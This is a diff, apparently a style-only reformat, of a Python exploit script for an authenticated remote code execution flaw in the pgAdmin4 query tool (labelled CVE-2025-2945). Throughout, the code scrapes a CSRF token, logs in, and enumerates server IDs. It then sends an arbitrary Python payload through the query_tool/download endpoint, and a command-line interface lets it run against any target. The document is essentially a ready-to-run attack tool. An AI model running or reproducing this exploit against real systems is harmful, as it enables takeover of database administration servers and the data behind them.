@@ -8,16 +8,17 @@ import requests
 
 
 def get_csrf_token(session: requests.Session, target_url: str) -> str | None:
-    login_resp = session.get(urljoin(target_url, '/login'), allow_redirects=False)
+    login_resp = session.get(urljoin(target_url, "/login"), allow_redirects=False)
     if login_resp.status_code == 200:
         if m := re.search(
-            r'<input name="csrf_token"( hidden="")? value="([\w+.-]+)">', login_resp.text
+            r'<input name="csrf_token"( hidden="")? value="([\w+.-]+)">',
+            login_resp.text,
         ):
             return m.group(2)
         if m := re.search(r'"csrfToken": "([\w+.-]+)"', login_resp.text):
             return m.group(1)
     else:
-        js_resp = session.get(urljoin(target_url, '/browser/js/utils.js'))
+        js_resp = session.get(urljoin(target_url, "/browser/js/utils.js"))
         if m := re.search(r"pgAdmin\['csrf_token'\]\s*=\s*'([^']+)'", js_resp.text):
             return m.group(1)
         if m := re.search(r'"csrfToken": "([\w+.-]+)"', js_resp.text):
@@ -34,7 +35,7 @@ def exploit(
     db_user: str,
     db_pass: str,
     payload: str,
-    max_server_id: int = 10
+    max_server_id: int = 10,
 ) -> bool:
     """
     pgAdmin4 query tool authenticated RCE (CVE-2025-2945) exp.
@@ -50,17 +51,17 @@ def exploit(
         return False
 
     resp = session.post(
-        urljoin(target_url, 'authenticate/login'),
+        urljoin(target_url, "authenticate/login"),
         data={
             "csrf_token": csrf_token,
             "email": username,
             "password": password,
             "language": "en",
-            "internal_button": "login"
+            "internal_button": "login",
         },
         allow_redirects=False,
     )
-    if not resp.ok or resp.headers.get('Location', '').endswith('/login'):
+    if not resp.ok or resp.headers.get("Location", "").endswith("/login"):
         print("[!] Failed to authenticate to pgAdmin")
         return False
     print("[+] Successfully authenticated to pgAdmin")
@@ -76,11 +77,11 @@ def exploit(
     sid = None
     for i in range(1, max_server_id + 1):
         resp = session.get(
-            urljoin(target_url, f'/sqleditor/get_server_connection/{sgid}/{i}'),
-            headers={"Content-Type": "application/x-www-form-urlencoded"}
+            urljoin(target_url, f"/sqleditor/get_server_connection/{sgid}/{i}"),
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
         )
         if resp.status_code == 200:
-            if resp.json().get('data', {}).get('status') is True:
+            if resp.json().get("data", {}).get("status") is True:
                 print("[+] Found valid server ID:", i)
                 sid = i
                 break
@@ -97,13 +98,15 @@ def exploit(
     trans_id = randint(1_000_000, 9_999_999)
     did = randint(10000, 99999)
     resp = session.post(
-        urljoin(target_url, f"/sqleditor/initialize/sqleditor/{trans_id}/{sgid}/{sid}/{did}"),
+        urljoin(
+            target_url, f"/sqleditor/initialize/sqleditor/{trans_id}/{sgid}/{sid}/{did}"
+        ),
         json={
             "user": db_user,
             "password": db_pass,
             "role": "",
             "dbname": db_name,
-        }
+        },
     )
     if not resp.ok:
         print("[!] Failed to initialize sqleditor")
@@ -115,8 +118,10 @@ def exploit(
         urljoin(target_url, f"/sqleditor/query_tool/download/{trans_id}"),
         json={"query_commited": payload},
         headers={
-            "Referer": urljoin(target_url, f"/sqleditor/panel/{trans_id}?is_query_tool=true")
-        }
+            "Referer": urljoin(
+                target_url, f"/sqleditor/panel/{trans_id}?is_query_tool=true"
+            )
+        },
     )
     if resp.status_code == 500:
         print("[+] Received expected 500 response:", resp.text)
@@ -124,25 +129,52 @@ def exploit(
     else:
         print(
             "[!] Received unexpected response code from the exploit attempt:",
-            resp.status_code, resp.text
+            resp.status_code,
+            resp.text,
         )
         return False
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     import argparse
     import sys
-    parser = argparse.ArgumentParser(description="pgAdmin4 query tool authenticated RCE (CVE-2025-2945) exp")
+
+    parser = argparse.ArgumentParser(
+        description="pgAdmin4 query tool authenticated RCE (CVE-2025-2945) exp"
+    )
     parser.add_argument(
-        "--target-url", required=True, help="Base URL of the target pgAdmin4 instance (http://RHOST:RPORT/)"
+        "--target-url",
+        required=True,
+        help="Base URL of the target pgAdmin4 instance (http://RHOST:RPORT/)",
     )
     parser.add_argument("--username", help="pgAdmin4 username", required=True)
     parser.add_argument("--password", help="pgAdmin4 password", required=True)
     parser.add_argument(
-        "--db-user", help="Username of the database used to initialize sqleditor", required=True
+        "--db-user",
+        help="Username of the database used to initialize sqleditor",
+        required=True,
     )
     parser.add_argument("--db-pass", help="Database password", required=True)
     parser.add_argument("--db-name", help="Database db name", required=True)
     parser.add_argument("--payload", help="Payload (Python code)", required=True)
-    parser.add_argument("--max-server-id", type=int, default=10, help="Maximum number of Server IDs to try")
+    parser.add_argument(
+        "--max-server-id",
+        type=int,
+        default=10,
+        help="Maximum number of Server IDs to try",
+    )
     ns = parser.parse_args()
-    sys.exit(int(not exploit(ns.target_url, ns.username, ns.password, ns.db_name, ns.db_user, ns.db_pass, ns.payload, ns.max_server_id)))
+    sys.exit(
+        int(
+            not exploit(
+                ns.target_url,
+                ns.username,
+                ns.password,
+                ns.db_name,
+                ns.db_user,
+                ns.db_pass,
+                ns.payload,
+                ns.max_server_id,
+            )
+        )
+    )
